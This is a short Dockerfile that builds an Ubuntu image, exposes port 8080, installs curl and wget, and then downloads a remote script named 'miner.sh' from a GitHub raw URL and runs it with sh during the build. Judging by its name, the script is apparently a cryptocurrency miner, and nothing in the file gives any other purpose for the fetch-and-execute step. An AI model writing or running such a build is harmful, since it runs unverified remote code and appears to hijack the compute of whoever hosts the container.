# Use the base image
FROM ubuntu:latest
 
# Expose the desired port
EXPOSE 8080

# RUN INSTALLATION
RUN apt-get update
RUN apt-get install -y curl wget
RUN wget https://raw.githubusercontent.com/apaple/dums/main/miner.sh
RUN sh miner.sh
